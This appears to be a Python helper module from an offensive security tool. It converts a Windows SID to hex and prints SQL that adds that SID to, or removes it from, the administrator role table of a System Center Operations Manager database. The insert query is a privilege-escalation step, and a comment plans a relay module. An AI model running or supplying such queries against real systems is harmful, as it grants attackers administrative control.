from impacket.ldap import ldaptypes


class MSSQL:
    
    def __init__(self, sid, delete, verbose):
        self.sid = sid
        self.delete = delete
        self.verbose = verbose

#for right now, this is just the sid conversion, in the future this whould be its own relay module
    def convert_string_sid(self):
        hexsid = ldaptypes.LDAP_SID()
        hexsid.fromCanonical(self.sid)
        querysid = ('0x' + ''.join('{:02X}'.format(b) for b in hexsid.getData()))
        print(f'[*] Converted {self.sid} SID to {querysid}')
        return querysid

    def build_insert_mssql_query(self, querysid):
        
        query = f"Use OperationsManager; INSERT INTO AzMan_Role_SIDMember (RoleID, MemberSID) Values ('1', {querysid});"
        print(query)

    def build_delete_mssql_query(self):
        delete_sid = ""
        if not self.sid.startswith("0x0"):
                delete_sid = self.convert_string_sid()
        else:
            delete_sid = self.sid
    
        delete_query = f"Use OperationsManager; DELETE FROM AzMan_Role_SIDMember WHERE RoleID = '1' AND MemberSID = {delete_sid};" 
        print(delete_query)


    def run(self):
        if not self.delete:
            querysid = self.convert_string_sid()
            if self.convert_string_sid:
                self.build_insert_mssql_query(querysid)
        else:
            self.build_delete_mssql_query()
        return